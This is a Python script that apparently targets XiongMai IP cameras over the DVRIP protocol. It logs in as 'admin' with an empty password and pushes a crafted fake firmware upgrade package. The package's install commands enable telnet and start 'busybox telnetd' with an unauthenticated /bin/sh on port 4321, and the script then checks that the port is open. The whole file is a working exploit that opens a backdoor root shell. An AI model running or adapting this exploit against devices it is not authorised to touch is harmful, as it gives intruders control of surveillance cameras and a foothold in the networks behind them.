#!/usr/bin/env python3

from dvrip import DVRIPCam
import zipfile
import socket
import json


def make_zip(filename, data):
    zipf = zipfile.ZipFile(filename, "w", zipfile.ZIP_DEFLATED)
    zipf.writestr("InstallDesc", data)
    zipf.close()


def check_port(host_ip, port):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result_of_check = a_socket.connect_ex((host_ip, port))
    return result_of_check == 0


def open_telnet(host_ip):
    armbenv = {
        "Command": "Shell",
        "Script": "armbenv -s xmuart 0; armbenv -s telnetctrl 1",
    }
    telnetd = {
        "Command": "Shell",
        "Script": "busybox telnetd -F -p 4321 -l /bin/sh",
    }
    desc = {"UpgradeCommand": [armbenv, telnetd], 'Hardware': '53H20L_S39',
            'DevID': '000025321001000000000000', 'CompatibleVersion': 2,
            'Vendor': 'General', 'CRC': '1ce6242100007636'
            }
    zipfname = "IPC_XiongMai_00000197_HI3520DV200_telnet_ZFTLAB-20210324.bin"
    make_zip(zipfname, json.dumps(desc, indent=2))
    cam = DVRIPCam(host_ip, user="admin", password="")
    if not cam.login():
        print(f"Cannot connect {host_ip}")
        return
    upinfo = cam.get_upgrade_info()
    print(f"Modifiying camera {upinfo['Hardware']}")
    cam.upgrade(zipfname)
    cam.close()
    if check_port(host_ip, 4321):
        print(f"Now use 'telnet {host_ip} 4321' to login")
    else:
        print("Something went wrong")


def main():
    open_telnet("IPG-53H20PL-S_2")


if __name__ == "__main__":
    main()
